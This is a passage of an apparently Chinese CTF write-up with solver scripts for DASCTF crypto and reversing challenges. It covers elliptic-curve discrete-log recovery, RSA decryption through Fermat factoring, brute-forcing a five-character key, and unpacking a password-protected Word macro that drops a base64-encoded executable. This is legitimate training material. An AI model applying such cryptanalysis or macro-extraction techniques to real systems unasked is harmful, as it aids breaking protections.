<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs sage">from sage.all import *<br>from Crypto.Util.number import long_to_bytes<br><br>def get_params():<br>    p = 10297529403524403127640670200603184608844065065952536889<br>    a = 2<br>    G = (8879931045098533901543131944615620692971716807984752065, <br>         4106024239449946134453673742202491320614591684229547464)<br>    d = 8817708809404273675545317762394593437543647288341187200<br>    b = 2023311503805954111362735874303860040942654548593039668<br>    return p, a, G, d, b<br><br>def calc_x1_y1(G, b, p):<br>    G_x, G_y = G<br>    x1 = G_x * b % p<br>    y1 = G_y<br>    return x1, y1<br><br>def check_d1(x1, y1, p, d1):<br>    assert (x1**3 + y1**3 + 1) % p == d1 * x1 * y1 % p, &quot;d1 校验失败&quot;<br><br>def calc_d2_uv(x1, y1, d1, p):<br>    d2 = (inverse_mod(3, p) * d1) % p<br>    u = (12 * (d2**3 - 1) * inverse_mod(d2 + x1 + y1, p) - 9 * d2**2) % p<br>    v = (36 * (y1 - x1) * (d2**3 - 1) * inverse_mod(d2 + x1 + y1, p)) % p<br>    return d2, u, v<br><br>def define_curve(d2, p):<br>    a4 = -27 * d2 * (d2**3 + 8)<br>    a6 = 54 * (d2**6 - 20 * d2**3 - 8)<br>    E = EllipticCurve(GF(p), [a4, a6])<br>    return E<br><br>def calc_Q(x2, y2, d2, p):<br>    u2 = (12 * (d2**3 - 1) * inverse_mod(d2 + x2 + y2, p) - 9 * d2**2) % p<br>    v2 = (36 * (y2 - x2) * (d2**3 - 1) * inverse_mod(d2 + x2 + y2, p)) % p<br>    return u2, v2<br><br>def factor_order(E):<br>    factors, exponents = zip(*factor(E.order()))<br>    primes = [factors[i]**exponents[i] for i in range(len(factors))][4:-1]<br>    return primes<br><br>def calc_logs(P, Q, primes):<br>    logs = []<br>    for p in primes:<br>        t = P.order() // p<br>        log = discrete_log(t * Q, t * P, operation=&quot;+&quot;)<br>        logs.append(log)<br>    return logs<br><br>def recover_with_crt(logs, primes):<br>    return crt(logs, primes)<br><br>def main():<br>    p, a, G, d, b = get_params()<br>    <br>    x1, y1 = calc_x1_y1(G, b, p)<br>    <br>    d1 = 4197156738236715923181334026153482564495893747641139426<br>    check_d1(x1, y1, p, d1)<br>    <br>    d2, u, v = calc_d2_uv(x1, y1, d1, p)<br>    <br>    E = define_curve(d2, p)<br>    <br>    P = E(u, v)<br>    x2, y2 = (6784278627340957151283066249316785477882888190582875173 * b % p, <br>              6078603759966354224428976716568980670702790051879661797)<br>    u2, v2 = calc_Q(x2, y2, d2, p)<br>    <br>    Q = E(u2, v2)<br>    <br>    print(&quot;椭圆曲线阶:&quot;, E.order())<br>    <br>    primes = factor_order(E)<br>    print(&quot;素数因子:&quot;, primes)<br>    <br>    logs = calc_logs(P, Q, primes)<br>    print(&quot;离散对数:&quot;, logs)<br>    <br>    recovered = recover_with_crt(logs, primes)<br>    print(&quot;恢复的标量:&quot;, recovered)<br>    print(&quot;解密的flag:&quot;, long_to_bytes(recovered))<br><br>main()<br><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/27/kfaCBA3dugIZmzP.png" srcset="/img/loading.gif" lazyload alt="image-20240827183600051"></p>
<h3 id="BabyCurve"><a href="#BabyCurve" class="headerlink" title="BabyCurve"></a>BabyCurve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> solve_congruence<br><span class="hljs-keyword">from</span> sympy.ntheory <span class="hljs-keyword">import</span> factorint<br><br><span class="hljs-comment"># Given data</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;iv&#x27;</span>: <span class="hljs-string">&#x27;bae1b42f174443d009c8d3a1576f07d6&#x27;</span>, <br>    <span class="hljs-string">&#x27;cipher&#x27;</span>: <span class="hljs-string">&#x27;ff34da7a65854ed75342fd4ad178bf577bd622df9850a24fd63e1da557b4b8a4&#x27;</span><br>&#125;<br>G_point = (<span class="hljs-number">584273268656071313022845392380</span>, <span class="hljs-number">105970580903682721429154563816</span>)<br>P_point = (<span class="hljs-number">401055814681171318348566474726</span>, <span class="hljs-number">293186309252428491012795616690</span>)<br>prime = <span class="hljs-number">770311352827455849356512448287</span><br><br>xG, yG = G_point<br>xP, yP = P_point<br>a_coeff = (xG**<span class="hljs-number">3</span> - xP**<span class="hljs-number">3</span> - yG**<span class="hljs-number">2</span> + yP**<span class="hljs-number">2</span>) * inverse(xP - xG, prime) % prime<br>b_coeff = (yG**<span class="hljs-number">2</span> - xG**<span class="hljs-number">3</span> - a_coeff * xG) % prime<br><br><span class="hljs-comment"># Elliptic curve operations</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elliptic_add</span>(<span class="hljs-params">P, Q, a, prime</span>):<br>    <span class="hljs-keyword">if</span> P == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> Q<br>    <span class="hljs-keyword">if</span> Q == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">return</span> P<br>    xP, yP = P<br>    xQ, yQ = Q<br>    <br>    <span class="hljs-keyword">if</span> P != Q:<br>        m = (yQ - yP) * inverse(xQ - xP, prime) % prime<br>    <span class="hljs-keyword">else</span>:<br>        m = (<span class="hljs-number">3</span> * xP**<span class="hljs-number">2</span> + a_coeff) * inverse(<span class="hljs-number">2</span> * yP, prime) % prime<br>    <br>    xR = (m**<span class="hljs-number">2</span> - xP - xQ) % prime<br>    yR = (m * (xP - xR) - yP) % prime<br>    <span class="hljs-keyword">return</span> (xR, yR)<br><br><span class="hljs-comment"># Calculate order of G</span><br>order = <span class="hljs-number">1</span><br>current = G_point<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    current = elliptic_add(current, G_point, a_coeff, prime)<br>    order += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> current == (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>):<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># Factor the order</span><br>factors = factorint(order)<br>x_values, y_values = [], []<br><br><span class="hljs-keyword">for</span> sub_order, exp <span class="hljs-keyword">in</span> factors.items():<br>    sub_order = sub_order ** exp<br>    A = (order // sub_order) * G_point<br>    B = (order // sub_order) * P_point<br>    x = discrete_log(B, A, order)<br>    x_values.append(x)<br>    y_values.append(sub_order)<br><br><span class="hljs-comment"># Chinese remainder theorem</span><br>x = solve_congruence(*[(x, y) <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(x_values, y_values)])[<span class="hljs-number">0</span>] % prod(y_values)<br><br><span class="hljs-comment"># Finding the scalar multiplier</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> elliptic_add(x * G_point, (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>), a_coeff, prime) == P_point:<br>        <span class="hljs-keyword">break</span><br>    x += prod(y_values)<br><br><span class="hljs-comment"># Decrypting the flag</span><br>iv = <span class="hljs-built_in">bytes</span>.fromhex(data[<span class="hljs-string">&quot;iv&quot;</span>])<br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(data[<span class="hljs-string">&quot;cipher&quot;</span>])<br>key = sha256(<span class="hljs-built_in">str</span>(x).encode()).digest()[:<span class="hljs-number">16</span>]<br>aes_cipher = AES.new(key, AES.MODE_CBC, iv)<br>flag = aes_cipher.decrypt(ciphertext)<br><br><span class="hljs-built_in">print</span>(flag.decode().strip())<br><span class="hljs-comment"># DASCTF&#123;THe_C0rv!_1s_Aw3s0me@!!&#125;</span><br></code></pre></td></tr></table></figure>



<h3 id="RSA-loss"><a href="#RSA-loss" class="headerlink" title="RSA_loss"></a>RSA_loss</h3><p>已经给我们了基本的rsa加密解密了 那么其他的解密方法就不用去考虑了 但是得到的m是不对的  那么根据同余的性质 符合解密公式的m有很多个 既然这个给我们的m不对  那我们就继续去调整m 知道得到正确的正则匹配的flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">import</span> re<br><br>p = <span class="hljs-number">898278915648707936019913202333</span><br>q = <span class="hljs-number">814090608763917394723955024893</span><br>c = <span class="hljs-number">356435791209686635044593929546092486613929446770721636839137</span><br>n = p * q<br>e = <span class="hljs-number">65537</span><br><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = invert(e, phi_n)<br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>m = <span class="hljs-built_in">int</span>(m)<br><br><span class="hljs-comment"># 调整 m 直到其最后一个字节为 125 (对应字符 &#x27;&#125;&#x27;)</span><br><span class="hljs-keyword">while</span> m % <span class="hljs-number">256</span> != <span class="hljs-number">125</span>:<br>    m += n<br><br>t = <span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span> + <span class="hljs-string">b&#x27;0&#x27;</span> * (math.floor(math.log(m, <span class="hljs-number">256</span>)) - <span class="hljs-number">7</span>)<br><br>decrypted_message = long_to_bytes(m)<br>step_size = n * <span class="hljs-number">256</span><br><span class="hljs-comment"># 循环调整 m 直到符合指定的正则表达式模式</span><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> re.fullmatch(<span class="hljs-string">b&#x27;[0-9a-zA-Z_&#123;&#125;]+&#x27;</span>, decrypted_message):<br>    <span class="hljs-keyword">if</span> decrypted_message.startswith(<span class="hljs-string">b&#x27;DASCTF&#123;&#x27;</span>):<br>        m += step_size<br>    <span class="hljs-keyword">else</span>:<br><br>        diff = bytes_to_long(t) - m<br>        m += step_size * (diff // step_size + (<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> diff % step_size != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>))<br>        t += <span class="hljs-string">b&#x27;0&#x27;</span><br><br>    m = <span class="hljs-built_in">int</span>(m)<br>    decrypted_message = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(decrypted_message)<br><br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/27/HkZL1gKRwYuszGb.png" srcset="/img/loading.gif" lazyload alt="image-20240827184028448"></p>
<h3 id="TheoremPlus"><a href="#TheoremPlus" class="headerlink" title="TheoremPlus"></a>TheoremPlus</h3><p>题目有提示这个Theorem ，去搜到 Wilson’s Theorem  这个公式就是当n为素数的时候 （n-1）!%n&#x3D;(n-1)</p>
<p>然后又去试了试后面不是素数的时候发现这个加密就是求的素数的个数啊  但是多了2，然后得到了e  什么都有了  就直接rsa基本解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> primepi<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> isqrt, invert<br><br>n = <span class="hljs-number">18770575776346636857117989716700159556553308603827318013591587255198383129370907809760732011993542700529211200756354110539398800399971400004000898098091275284235225898698802555566416862975758535452624647017057286675078425814784682675012671384340267087604803050995107534481069279281213277371234272710195280647747033302773076094600917583038429969629948198841325080329081838681126456119415461246986745162687569680825296434756908111148165787768172000131704615314046005916223370429567142992192702888820837032850104701948658736010527261246199512595520995042205818856177310544178940343722756848658912946025299687434514029951</span><br>c = <span class="hljs-number">2587907790257921446754254335909686808394701314827194535473852919883847207482301560195700622542784316421967768148156146355099210400053281966782598551680260513547233270646414440776109941248869185612357797869860293880114609649325409637239631730174236109860697072051436591823617268725493768867776466173052640366393488873505207198770497373345116165334779381031712832136682178364090547875479645094274237460342318587832274304777193468833278816459344132231018703578274192000016560653148923056635076144189403004763127515475672112627790796376564776321840115465990308933303392198690356639928538984862967102082126458529748355566</span><br>e = primepi(<span class="hljs-number">703440151</span>) - <span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fermat</span>(<span class="hljs-params">n</span>):<br>    a = isqrt(n)<br>    b2 = a * a - n<br>    b = isqrt(n)<br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> b * b != b2:<br>        a = a + <span class="hljs-number">1</span><br>        b2 = a * a - n<br>        b = isqrt(b2)<br>        count += <span class="hljs-number">1</span><br>    p = a + b<br>    q = a - b<br>    <span class="hljs-keyword">assert</span> n == p * q<br>    <span class="hljs-keyword">return</span> p, q<br><br><span class="hljs-comment"># 使用 Fermat 分解</span><br>p, q = fermat(n)<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>ee = <span class="hljs-built_in">int</span>(e)<br>d = <span class="hljs-built_in">int</span>(invert(ee, phi))<br><br><span class="hljs-comment"># 执行解密</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 将 m 转换为 Python 的 int 类型</span><br>m = <span class="hljs-built_in">int</span>(m)<br><br><span class="hljs-comment"># 将 m 转换为字节并打印解密的消息</span><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure>

<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pic"><a href="#pic" class="headerlink" title="pic"></a>pic</h3><p>输入key后发现flag的图片发生了改变</p>
<p>于是遍历所有的key来爆破 所有的图片</p>
<p>最后能得到flag</p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> shutil<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_png_signature</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># 验证数据是否具有PNG文件的标志性字节（签名）。</span><br>    <span class="hljs-keyword">return</span> data[:<span class="hljs-number">8</span>] == <span class="hljs-string">b&#x27;\x89PNG\r\n\x1a\n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_png_in_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-comment"># 打开文件并检查其内容是否包含有效的PNG签名。</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        content = file.read()<br>    <span class="hljs-keyword">return</span> validate_png_signature(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command_and_validate</span>(<span class="hljs-params">input_value</span>):<br>    <span class="hljs-comment"># 执行外部命令，并将输入传递给它。检查输出文件是否为有效的PNG。</span><br>    proc = subprocess.Popen(<br>        [<span class="hljs-string">&#x27;re.exe&#x27;</span>],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=<span class="hljs-literal">True</span><br>    )<br><br>    <span class="hljs-comment"># 获取命令的输出和错误信息</span><br>    output, errors = proc.communicate(<span class="hljs-built_in">input</span>=input_value)<br><br>    <span class="hljs-keyword">if</span> errors:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;errors&quot;</span>)<br><br>    <span class="hljs-comment"># 验证生成的flag.png文件是否为有效的PNG</span><br>    <span class="hljs-keyword">if</span> verify_png_in_file(<span class="hljs-string">&#x27;&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(input_value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BF</span>():<br>    <span class="hljs-comment"># 生成所有可能的5字符组合（数字和小写字母），并尝试破解。</span><br>    charset = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><br>    <span class="hljs-keyword">for</span> combination <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">5</span>):<br>        candidate_key = <span class="hljs-string">&#x27;&#x27;</span>.join(combination)<br>        execute_command_and_validate(candidate_key)<br>        swap_files(<span class="hljs-string">&#x27;my.png&#x27;</span>, <span class="hljs-string">&#x27;my1.png&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">swap_files</span>(<span class="hljs-params">source_file, destination_file</span>):<br>    <span class="hljs-comment"># 用源文件替换目标文件。如果目标文件存在，则先删除它。</span><br>    <span class="hljs-keyword">if</span> os.path.exists(destination_file):<br>        os.remove(destination_file)<br>    shutil.copy(source_file, destination_file)<br><br>BF()<br><br></code></pre></td></tr></table></figure>



<h3 id="docCrack"><a href="#docCrack" class="headerlink" title="docCrack"></a>docCrack</h3><p>打开发现宏被禁用了，启用看看</p>
<p><img src="https://s2.loli.net/2024/08/28/67pqwEKrgISOGFb.png" srcset="/img/loading.gif" lazyload alt="image-20240828005420389"></p>
<p>看看宏的源文件，发现有密码</p>
<p><img src="https://s2.loli.net/2024/08/28/VCtYE1QmfAjGNen.png" srcset="/img/loading.gif" lazyload alt="image-20240828021158749"></p>
<p>用passware kit爆破得到密码</p>
<p><img src="https://s2.loli.net/2024/08/28/tOnsbXu9koLxGVg.png" srcset="/img/loading.gif" lazyload alt="image-20240828015044581"></p>
<p>查看vb源文件，发现有操作del了文件，把它删掉，得到temp1文件</p>
<p><img src="https://s2.loli.net/2024/08/28/hbfywRYsrV5vGPN.png" srcset="/img/loading.gif" lazyload alt="image-20240828021651014"></p>
<p><img src="https://s2.loli.net/2024/08/28/KXEeNLpm8caHbG3.png" srcset="/img/loading.gif" lazyload alt="image-20240828021737480"></p>
<p>不知道是什么加密方法，把docm拖到沙箱里</p>
<p><img src="https://s2.loli.net/2024/08/28/3z92KFXOma1qUwf.png" srcset="/img/loading.gif" lazyload alt="image-20240828021952371"></p>
<p>两次base64得到mz开头的文件，下载下来</p>
<p><img src="https://s2.loli.net/2024/08/28/gQp9jcWtBxy6SMu.png" srcset="/img/loading.gif" lazyload alt="image-20240828022040111"></p>
<p>拖到ida里</p>
<p><img src="https://s2.loli.net/2024/08/28/pQfBVZb7y5vues6.png" srcset="/img/loading.gif" lazyload alt="image-20240828022155327"></p>
<p>就是简单的位移</p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">v7 = [<span class="hljs-number">4288</span>, <span class="hljs-number">4480</span>, <span class="hljs-number">5376</span>, <span class="hljs-number">4352</span>, <span class="hljs-number">5312</span>, <span class="hljs-number">4160</span>, <span class="hljs-number">7936</span>, <span class="hljs-number">5184</span>, <span class="hljs-number">6464</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">3456</span>,<span class="hljs-number">7424</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">6336</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">6720</span>, <span class="hljs-number">6144</span>, <span class="hljs-number">6272</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">6656</span>, <span class="hljs-number">7296</span>, <span class="hljs-number">7424</span>, <span class="hljs-number">2432</span>,<span class="hljs-number">2432</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">4416</span>, <span class="hljs-number">3456</span>, <span class="hljs-number">7168</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">6272</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">3520</span>, <span class="hljs-number">6208</span>,<span class="hljs-number">5632</span>, <span class="hljs-number">4736</span>, <span class="hljs-number">6528</span>, <span class="hljs-number">6400</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">3520</span>, <span class="hljs-number">5632</span>, <span class="hljs-number">5184</span>, <span class="hljs-number">3456</span>, <span class="hljs-number">7488</span>, <span class="hljs-number">7296</span>, <span class="hljs-number">3200</span>,<span class="hljs-number">6272</span>, <span class="hljs-number">7424</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">2432</span>, <span class="hljs-number">7808</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v7)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(v7[i] &gt;&gt; <span class="hljs-number">6</span>) , end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/08/28/4oBiKwMHftEPjGn.png" srcset="/img/loading.gif" lazyload alt="image-20240828022912708"></p>
<p>cyberchef里magic就能得到flag</p>
<p><img src="https://s2.loli.net/2024/08/28/SP6dKo5HspC9lqv.png" srcset="/img/loading.gif" lazyload alt="image-20240828023022441"></p>
<h3 id="你这主函数保真么"><a href="#你这主函数保真么" class="headerlink" title="你这主函数保真么"></a>你这主函数保真么</h3><p>首先找到真正的主函数</p>
<p><img src="https://s2.loli.net/2024/08/28/pYokft4MO9PRJEi.png" srcset="/img/loading.gif" lazyload alt="image-20240828005008357"></p>
<p>一个简单的离散余弦的逆变化和一个四舍五入，别忘了test2最后是一个rot13</p>
<p><img src="https://s2.loli.net/2024/08/28/ph4VXNgw9WocubP.png" srcset="/img/loading.gif" lazyload alt="image-20240828005109916"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> dct, idct<br>A=[<span class="hljs-number">513.355</span>, -<span class="hljs-number">37.7986</span>, <span class="hljs-number">8.7316</span>, -<span class="hljs-number">10.7832</span>, -<span class="hljs-number">1.3097</span>, -<span class="hljs-number">20.5779</span>,<span class="hljs-number">6.98641</span>, -<span class="hljs-number">29.2989</span>, <span class="hljs-number">15.9422</span>, <span class="hljs-number">21.4138</span>, <span class="hljs-number">29.4754</span>, -<span class="hljs-number">2.77161</span>,-<span class="hljs-number">6.58794</span>, -<span class="hljs-number">4.22332</span>, -<span class="hljs-number">7.20771</span>, <span class="hljs-number">8.83506</span>, -<span class="hljs-number">4.38138</span>, -<span class="hljs-number">19.3898</span>,<br>   <span class="hljs-number">18.3453</span>, <span class="hljs-number">6.88259</span>, -<span class="hljs-number">14.7652</span>, <span class="hljs-number">14.6102</span>, <span class="hljs-number">24.7414</span>, -<span class="hljs-number">11.6222</span>,-<span class="hljs-number">9.754759999999999</span>, <span class="hljs-number">12.2424</span>, <span class="hljs-number">13.4343</span>, -<span 